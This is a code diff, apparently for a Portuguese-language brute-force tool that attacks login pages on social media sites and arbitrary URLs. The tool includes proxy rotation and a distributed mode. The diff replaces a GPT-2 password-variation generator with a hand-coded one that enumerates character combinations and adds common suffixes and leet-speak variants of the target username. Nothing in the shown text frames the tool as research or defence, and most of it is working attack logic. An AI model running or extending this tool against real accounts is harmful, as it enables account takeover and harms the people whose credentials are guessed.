@@ -24,7 +24,6 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import TimeoutException
-from transformers import pipeline
 from celery import Celery
 from redis import Redis
 
@@ -57,18 +56,6 @@ class AttackState:
         self.last_proxy_rotation = 0
 
 state = AttackState()
-
-class AIPasswordGenerator:
-    def __init__(self):
-        self.generator = pipeline('text-generation', model='gpt2-medium')
-    
-    def generate(self, base_word):
-        prompts = [
-            f"Variações comuns de senha para {base_word}:",
-            f"Transformações leet speak para {base_word}:",
-            f"Padrões de senha similares a {base_word}:"
-        ]
-        return self.generator(prompts, max_length=50)
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -185,9 +172,7 @@ def get_target_info():
             console.print("[error]Arquivo não encontrado![/]")
             wordlist_path = None
     
-    use_ai = console.input("[prompt]Deseja usar IA para gerar variações de senha? (s/n): [/]").lower() == 's'
-    
-    return username, min_length, max_length, chars, wordlist_path, use_ai
+    return username, min_length, max_length, chars, wordlist_path
 
 def configure_proxy():
     show_banner()
@@ -434,15 +419,56 @@ def brute_force_worker(url, username, password, timeout=10):
             state.attempts += 1
         return False
 
-def generate_passwords(min_len, max_len, chars, base_word=None, use_ai=False):
-    if use_ai and base_word:
-        ai_gen = AIPasswordGenerator()
-        for variant in ai_gen.generate(base_word):
-            yield variant
-    else:
-        for length in range(min_len, max_len + 1):
-            for attempt in product(chars, repeat=length):
-                yield ''.join(attempt)
+def generate_passwords(min_len, max_len, chars, base_word=None):
+    # Gera senhas simples baseadas em caracteres
+    for length in range(min_len, max_len + 1):
+        for attempt in product(chars, repeat=length):
+            yield ''.join(attempt)
+    
+    # Adiciona variações comuns se houver uma palavra base
+    if base_word:
+        # Variações comuns
+        variations = [
+            base_word,
+            base_word + "123",
+            base_word + "1234",
+            base_word + "12345",
+            base_word + "!",
+            base_word + "@",
+            base_word + "#",
+            base_word.upper(),
+            base_word.lower(),
+            base_word.capitalize(),
+            base_word + "2023",
+            base_word + "2024",
+            base_word + "1",
+            base_word + "12",
+            base_word + "123456",
+            base_word + ".",
+            base_word + "?",
+        ]
+        
+        # Adiciona algumas transformações leet speak básicas
+        leet_replacements = {
+            'a': '4',
+            'e': '3',
+            'i': '1',
+            'o': '0',
+            's': '5',
+            't': '7'
+        }
+        
+        leet_word = []
+        for char in base_word:
+            if char.lower() in leet_replacements:
+                leet_word.append(leet_replacements[char.lower()])
+            else:
+                leet_word.append(char)
+        variations.append(''.join(leet_word))
+        
+        for variation in variations:
+            if min_len <= len(variation) <= max_len:
+                yield variation
 
 def load_wordlist(path):
     try:
@@ -467,14 +493,14 @@ def show_stats():
         return True
     return False
 
-def start_brute_force(url, username, min_len, max_len, chars, wordlist_path=None, use_ai=False):
+def start_brute_force(url, username, min_len, max_len, chars, wordlist_path=None):
     state.__init__()  # Resetar estado
     
     console.print(f"\n[header]Iniciando ataque de força bruta em {url}[/]")
     console.print(f"[info]Alvo: {username}[/]")
     console.print(f"[info]Intervalo de senhas: {min_len}-{max_len} caracteres[/]")
     
-    password_generator = load_wordlist(wordlist_path) if wordlist_path else generate_passwords(min_len, max_len, chars, username, use_ai)
+    password_generator = load_wordlist(wordlist_path) if wordlist_path else generate_passwords(min_len, max_len, chars, username)
     
     with Progress(
         TextColumn("[progress.description]{task.description}"),
@@ -578,8 +604,8 @@ def main():
                     continue
                 
                 url = get_social_media_url(sm_choice)
-                username, min_len, max_len, chars, wordlist_path, use_ai = get_target_info()
-                start_brute_force(url, username, min_len, max_len, chars, wordlist_path, use_ai)
+                username, min_len, max_len, chars, wordlist_path = get_target_info()
+                start_brute_force(url, username, min_len, max_len, chars, wordlist_path)
                 
                 if not state.found:
                     console.print("[error]Ataque concluído - senha não encontrada[/]")
@@ -587,8 +613,8 @@ def main():
             
             elif choice == 2:
                 url = console.input("[prompt]Digite a URL de login: [/]")
-                username, min_len, max_len, chars, wordlist_path, use_ai = get_target_info()
-                start_brute_force(url, username, min_len, max_len, chars, wordlist_path, use_ai)
+                username, min_len, max_len, chars, wordlist_path = get_target_info()
+                start_brute_force(url, username, min_len, max_len, chars, wordlist_path)
                 
                 if not state.found:
                     console.print("[error]Ataque concluído - senha não encontrada[/]")
@@ -614,7 +640,7 @@ def main():
             
             elif choice == 6:
                 url = console.input("[prompt]Digite a URL de login: [/]")
-                username, min_len, max_len, chars, _, _ = get_target_info()
+                username, min_len, max_len, chars, _ = get_target_info()
                 start_distributed_attack(url, username, min_len, max_len, chars)
                 input("\n[prompt]Pressione Enter para continuar...[/]")
             
